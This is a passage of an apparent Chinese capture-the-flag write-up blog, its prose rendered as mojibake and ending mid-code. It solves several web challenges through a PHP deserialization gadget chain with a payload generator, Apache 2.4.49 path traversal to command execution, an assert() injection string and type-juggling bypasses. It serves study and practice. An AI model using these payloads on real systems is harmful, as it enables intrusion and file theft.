class="line"></span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»æœ‰ç‚¹å¤šï¼Œä½†æ˜¯é“¾å­ä¸é•¿ã€‚</p><p>ä»åå¾€å‰æ‰¾ï¼Œæ‰¾rceçš„åœ°æ–¹æˆ–è€…æ–‡ä»¶è¯»å–çš„åœ°æ–¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿æ€ä¹ˆè·ŸåŸç”Ÿç±»çš„foreachè¿™ä¹ˆåƒå‘¢ï¼Ÿï¼ŸæŸ¥ä¸€ä¸‹array_walkï¼Œå‘ç°æ˜¯è°ƒç”¨å›è°ƒå‡½æ•°çš„ä¸€ä¸ªå‡½æ•°</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png" alt="image-20241231103913709"></p><p>å°¾éƒ¨æ‰¾åˆ°äº†ï¼Œå¾€ä¸Šæ‰¾ï¼Œ</p><p>Eç±»çš„geté­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é“¾å­ç»“æŸï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__get() -&gt; Heraclqs::__invoke() -&gt;Sakura::__toString() -&gt;Sakura::__destruct()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„å°±æ˜¯md5ï¼Œå¾ˆç®€å•ï¼Œæˆ‘æœ‰è„šæœ¬çš„ã€‚</p><p>ç„¶åéœ€è¦æ³¨æ„çš„å°±æ˜¯array_walkäº†ï¼</p><p>å…ˆè‡ªå·±æœ¬åœ°æµ‹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Monday =&gt; &quot;</span>.<span class="variable">$Monday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Tuesday =&gt; &quot;</span>.<span class="variable">$Tuesday</span>.<span class="string">&quot; | &quot;</span>;</span><br><span class="line">            <span class="comment">// $Wednesday = new $Tuesday($Monday);</span></span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;e = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaaa = <span class="string">&quot;321&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">print</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#Monday =&gt; 123 | Tuesday =&gt; e | Monday =&gt; 321 | Tuesday =&gt; aaaa | </span></span><br></pre></td></tr></table></figure><p>okçŸ¥é“æ€ä¹ˆåˆ©ç”¨äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&#x27;5659&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sakura</span> = <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;apple=<span class="variable">$sakura</span>;</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$sakura</span>-&gt;strawberry-&gt;grape-&gt;<span class="built_in">SplFileObject</span>=<span class="string">&#x27;/1_ffffffflllllagggggg&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sakura</span>));</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png" alt="image-20241231104320343" style="zoom: 67%;" /><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>æ‰“å¼€åé¡µé¢é‡Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰«ç›®å½•ä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«å…³é”®çš„ä¿¡æ¯ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png" alt="image-20250101090545818"></p><p>çœ‹åˆ°ä¸€å †cgiï¼Ÿï¼Ÿçœ‹ä¸Šå»åƒæ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å¤åˆ¶ç²˜è´´è¿‡å»å‘ç°ä¸è¡Œï¼Œçœ‹çœ‹æ¡†æ¶ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png" alt="image-20250101090618525" style="zoom: 67%;" /><p>Apache2.4.49ï¼Œæœä¸‹æœ‰æ²¡æœ‰æ´ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png" alt="image-20250101090736212"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png" alt="image-20250101091459532"></p><p>è·¯å¾„ç©¿è¶Š</p><p>ä½†æˆ‘ä»¬ç›´æ¥è¯•cgi-binç›®å½•ä¸‹æ˜¯ä¸å¯ä»¥çš„ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªå¯ä»¥&#x2F;cgi-bin&#x2F;test-cgi</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png" alt="image-20250101091449658" style="zoom:67%;" /><p>å¯ä»¥grepéå†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo;grep -r &quot;NSS&quot; /flag_is_here</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png" alt="image-20250101091544695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;5949084d-677b-43d8-ae0e-f156c491e4f2&#125;</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png" alt="image-20250101085153202" style="zoom:80%;" /><p>è¿™é‡Œå…ˆå°è¯•id1ï¼Œå’Œä»·æ ¼2</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png" alt="image-20250101085554674"></p><p>è¿™é‡Œæ˜¾ç¤ºå•†å“é”™è¯¯</p><p>ç„¶åå°è¯•idï¼Œ1,2,3éƒ½æ˜¯ä¸€æ ·çš„é”™è¯¯</p><p>id&#x3D;4æ—¶ï¼Œè¾“å…¥1337çš„é”™è¯¯æ˜¯<code>only one char</code></p><p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦</p><p>è¿™é‡Œåˆ©ç”¨çš„æ¼æ´æ˜¯unicodeå®‰å…¨é—®é¢˜ï¼Œæ˜¯å…³äºUniondeç­‰ä»·æ€§çš„æ¼æ´</p><p>è¿™é‡Œç”±äºåªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨äº†<a href="https://so.csdn.net/so/search?q=utf-8%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">utf-8ç¼–ç </a>ã€‚</p><p>ä¸¤ä¸ªä¸åŒç¼–ç çš„Unicodeå­—ç¬¦å¯èƒ½å­˜åœ¨ä¸€å®šçš„ç­‰ä»·æ€§ï¼Œè¿™ç§ç­‰ä»·æ˜¯å­—ç¬¦æˆ–å­—ç¬¦åºåˆ—ä¹‹é—´æ¯”è¾ƒå¼±çš„ç­‰ä»·ç±»å‹ï¼Œè¿™äº›å˜ä½“å½¢å¼å¯èƒ½ä»£è¡¨åœ¨æŸäº›å­—ä½“æˆ–è¯­å¢ƒä¸­å­˜åœ¨è§†è§‰ä¸Šæˆ–æ„ä¹‰ä¸Šçš„ç›¸ä¼¼æ€§ã€‚</p><p>è¿™é‡Œåœ¨compartç½‘ç«™ä¸Šæ‰¾ä¸€ä¸ªå¤§äº1337çš„å€¼,äºæ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦æ¯”1337å¤§çš„æ•°å­—</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>åœ¨æœç´¢æ¡†ä¸­æœç´¢thousand</p><p>è¿™é‡Œæˆ‘é€‰æ‹©äº†ç½—é©¬æ•°å­—åä¸‡ï¼Œæ•°å€¼æ˜¯100000</p><p>utf-8çš„å€¼æ˜¯0xE2 0x86 0x88</p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨utf-8çš„è¯æ˜¯ä¸è¡Œçš„</p><p>å°†utf-8çš„å€¼ä¸­çš„0xå˜ä¸º%</p><p>%E2%86%88</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png" alt="image-20250101085700376"></p><h2 id="NSSRound-17-Basic-çœŸÂ·ç­¾åˆ°"><a href="#NSSRound-17-Basic-çœŸÂ·ç­¾åˆ°" class="headerlink" title="[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°"></a>[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!æ­¤è·¯ä¸é€šï¼ï¼&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œä¸æ˜¯è¯´äº†å—ï¼ï¼ï¼å¿…é¡»æ˜¯ 732339662 (æ‹›æ–°ç¾¤ç¾¤å·ï¼)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å•Šï¼Ÿè¿™æ˜¯ä»€ä¹ˆæ–°å‹æ¯”è¾ƒï¼Ÿ&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ˜¯ä¸æ˜¯é¢˜é”™äº†å•Š&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…³é”®ç‚¹æ˜¯ <code>$_GET[&#39;nss&#39;] == 732339662</code> å’Œ <code>assert(&quot;is_numeric($_GET[nss])==0&quot;)</code></p><p>æ­¤å¤„ assret ç›´æ¥é‡‡ç”¨å­—ç¬¦ä¸² assert, ä¹Ÿå°±æ˜¯è¯´ä¼ å…¥çš„å˜é‡ä¼šè¢«ç›´æ¥è§£æå‡ºæ¥æ‹¼æ¥åˆ°ä»£ç ä¸­</p><p>å¼±æ¯”è¾ƒçš„è¯åªéœ€è¦å­—ç¬¦ä¸²å‰é¢æ˜¯ç›¸åŒæ•°å­—, åé¢æ— è®ºæ‹¼æ¥äº†ä»€ä¹ˆéƒ½ä¸ä¼šç®¡äº†</p><p>äºæ˜¯æˆ‘ä»¬ä»€ä¹ˆéƒ½å¯ä»¥æ„é€ , æ¯”å¦‚ <code>732339662) or (1</code> å³å¯æ‹¿ flag</p><h2 id="NSSRound-16-Basic-äº†è§£è¿‡PHPç‰¹æ€§å—"><a href="#NSSRound-16-Basic-äº†è§£è¿‡PHPç‰¹æ€§å—" class="headerlink" title="[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—"></a>[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹numï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½åŒ¹é…åˆ°æ•°å­—ï¼Œintvalååˆè¦ç­‰äº1.</p><p>å¯ä»¥ç”¨éç©ºæ•°ç»„ç»•è¿‡ï¼Œ?num[]&#x3D;1è¿™é‡Œçš„1ä¸ä¼šè¢«æ­£åˆ™åŒ¹é…åˆ°ã€‚</p><p>ç„¶åçœ‹è¿™é‡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 